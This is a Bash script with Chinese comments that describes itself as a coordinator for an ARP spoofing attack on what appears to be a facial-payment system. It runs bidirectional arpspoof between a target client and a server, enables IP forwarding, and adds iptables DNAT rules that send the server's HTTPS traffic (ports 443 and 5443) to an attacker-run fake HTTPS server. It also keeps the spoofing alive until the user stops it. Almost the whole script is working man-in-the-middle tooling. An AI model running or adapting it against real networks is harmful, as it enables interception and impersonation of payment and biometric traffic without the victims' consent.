#!/bin/bash
# coordinator.sh - 简化的 ARP 欺骗攻击协调脚本
# 位置: facial-payment-attack/tools/coordinator.sh

# 设置日志颜色
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # 无颜色

# 输出带颜色的消息
log() {
  echo -e "${GREEN}[*]${NC} $1"
}
log_warn() {
  echo -e "${YELLOW}[!]${NC} $1"
}
log_error() {
  echo -e "${RED}[X]${NC} $1"
}
log_info() {
  echo -e "${BLUE}[i]${NC} $1"
}

# 检查是否为 root 用户
if [ "$EUID" -ne 0 ]; then
  log_error "必须以 root 身份运行此脚本 (sudo ./coordinator.sh)"
  exit 1
fi

# 检查参数
if [ "$#" -ne 3 ]; then
  log_error "用法: sudo $0 <目标客户端IP> <原始服务器IP> <攻击者IP>"
  exit 1
fi

# 设置变量
TARGET_IP="$1"      # 目标客户端IP
HOST_IP="$2"        # 原始服务器IP
LOCAL_IP="$3"       # 攻击者IP
IFACE="eth0"  # 替换为你的实际网络接口名称
FAKE_SERVER_SCRIPT_PATH="$(dirname "$0")/fake_https.py" # 使用脚本所在目录
LOG_DIR="/tmp/facial-attack-logs-simple"

# 输出配置信息
log "攻击配置:"
log_info "目标终端 IP: $TARGET_IP"
log_info "原始服务器 IP: $HOST_IP"
log_info "攻击者 IP: $LOCAL_IP"
log_info "网络接口: $IFACE"
log_info "伪造服务器脚本: $FAKE_SERVER_SCRIPT_PATH"
log_info "日志目录: $LOG_DIR"

# 检查必要程序是否存在
for cmd in python3 arpspoof iptables; do
  if ! command -v $cmd &> /dev/null; then
    log_error "找不到命令: $cmd"
    log_error "请先安装所需依赖"
    exit 1
  fi
done

# 检查 fake_server.py 文件是否存在
if [ ! -f "$FAKE_SERVER_SCRIPT_PATH" ]; then
  log_error "找不到伪造服务器脚本: $FAKE_SERVER_SCRIPT_PATH"
  exit 1
fi

# 检查 Python 依赖
log "检查 Python OpenCV..."
if ! python3 -c "import cv2" &> /dev/null; then
  log_error "无法导入 cv2 模块，请确保已安装 python3-opencv"
  log_error "尝试运行: sudo apt install python3-opencv"
  exit 1
fi

# 创建日志目录
mkdir -p "$LOG_DIR"
log "创建日志目录: $LOG_DIR"

# 存储进程 ID
FAKE_SERVER_PID=""
ARP_PID1=""
ARP_PID2=""

# 清理函数
cleanup() {
  log "收到中断信号，清理中..."
  
  # 停止 ARP 欺骗
  if [ -n "$ARP_PID1" ]; then
    log "停止 ARP 欺骗进程 1 (PID: $ARP_PID1)"
    kill -9 $ARP_PID1 2>/dev/null || true
  fi
  
  if [ -n "$ARP_PID2" ]; then
    log "停止 ARP 欺骗进程 2 (PID: $ARP_PID2)"
    kill -9 $ARP_PID2 2>/dev/null || true
  fi
  
  # 停止伪造服务器
  if [ -n "$FAKE_SERVER_PID" ]; then
    log "停止伪造服务器 (PID: $FAKE_SERVER_PID)"
    kill -9 $FAKE_SERVER_PID 2>/dev/null || true
  fi
  
  # 禁用 IP 转发
  log "禁用 IP 转发"
  echo 0 > /proc/sys/net/ipv4/ip_forward
  
  # 清除 iptables 规则
  log "清除 iptables 规则"
  iptables -t nat -F
  iptables -t nat -X
  
  log "清理完成。退出。"
  exit 0
}

# 捕获中断信号
trap cleanup SIGINT SIGTERM EXIT

# 设置网络环境
log "启用 IP 转发"
echo 1 > /proc/sys/net/ipv4/ip_forward

log "清除旧的 NAT 规则"
iptables -t nat -F
iptables -t nat -X

# 显示当前的 iptables 规则
log_info "当前 NAT 表规则:"
iptables -t nat -L -v

# 启动伪造服务器
log "启动伪造 HTTPS 服务器 (需要 root 权限)"
python3 "$FAKE_SERVER_SCRIPT_PATH" > "$LOG_DIR/fake_server.log" 2>&1 &
FAKE_SERVER_PID=$!
log_info "伪造服务器已启动，PID: $FAKE_SERVER_PID"

# 等待服务器启动
sleep 2

# 检查伪造服务器是否成功启动
if ! ps -p $FAKE_SERVER_PID > /dev/null; then
  log_error "伪造服务器启动失败，查看日志: $LOG_DIR/fake_server.log"
  cat "$LOG_DIR/fake_server.log"
  cleanup
  exit 1
fi

log "伪造服务器成功启动，日志位置: $LOG_DIR/fake_server.log"

# 设置 iptables 规则，将发往原始服务器的 HTTPS 流量重定向到伪造服务器
log "设置 HTTPS 流量重定向"
iptables -t nat -A PREROUTING -p tcp -d $HOST_IP --dport 443 -j DNAT --to-destination $LOCAL_IP:443
iptables -t nat -A PREROUTING -p tcp -d $HOST_IP --dport 5443 -j DNAT --to-destination $LOCAL_IP:443
log_info "已设置重定向: $HOST_IP:443 -> $LOCAL_IP:443"
log_info "已设置重定向: $HOST_IP:5443 -> $LOCAL_IP:443"

# 启动 ARP 欺骗
log "启动双向 ARP 欺骗"
arpspoof -i "$IFACE" -t "$TARGET_IP" "$HOST_IP" > "$LOG_DIR/arpspoof_client.log" 2>&1 &
ARP_PID1=$!
log_info "ARP 欺骗 1 启动: 告诉客户端 ($TARGET_IP) 我是服务器 ($HOST_IP), PID: $ARP_PID1"

arpspoof -i "$IFACE" -t "$HOST_IP" "$TARGET_IP" > "$LOG_DIR/arpspoof_server.log" 2>&1 &
ARP_PID2=$!
log_info "ARP 欺骗 2 启动: 告诉服务器 ($HOST_IP) 我是客户端 ($TARGET_IP), PID: $ARP_PID2"

# 显示当前的 NAT 规则
log_info "NAT 表规则 (设置后):"
iptables -t nat -L -v

log "攻击协调完成！请在客户端运行:"
log_info "python3 client/original/https-client-monitor.py https://\$ORIGIN_SERVER_IP:443/video_feed"
log_info "或  python3 client/original/https-client-monitor.py https://\$ORIGIN_SERVER_IP:5443/video_feed"
log "当前日志输出:"
echo "=================== 伪造服务器日志 ==================="
tail -n 10 "$LOG_DIR/fake_server.log"

log "保持此窗口运行，按 Ctrl+C 结束攻击..."

# 循环等待
while true; do
  # 简单检查进程是否存在
  if ! ps -p $FAKE_SERVER_PID > /dev/null; then
    log_error "伪造服务器已停止！请检查日志"
    cat "$LOG_DIR/fake_server.log"
    cleanup
    exit 1
  fi
  
  if ! ps -p $ARP_PID1 > /dev/null || ! ps -p $ARP_PID2 > /dev/null; then
    log_error "ARP 欺骗进程已停止！尝试重启"
    
    if ! ps -p $ARP_PID1 > /dev/null; then
      arpspoof -i "$IFACE" -t "$TARGET_IP" "$HOST_IP" > "$LOG_DIR/arpspoof_client.log" 2>&1 &
      ARP_PID1=$!
      log_info "重启 ARP 欺骗 1, 新 PID: $ARP_PID1"
    fi
    
    if ! ps -p $ARP_PID2 > /dev/null; then
      arpspoof -i "$IFACE" -t "$HOST_IP" "$TARGET_IP" > "$LOG_DIR/arpspoof_server.log" 2>&1 &
      ARP_PID2=$!
      log_info "重启 ARP 欺骗 2, 新 PID: $ARP_PID2"
    fi
  fi
  
  # 显示最新日志
  log_info "最新服务器日志:"
  tail -n 3 "$LOG_DIR/fake_server.log"
  
  sleep 10
done
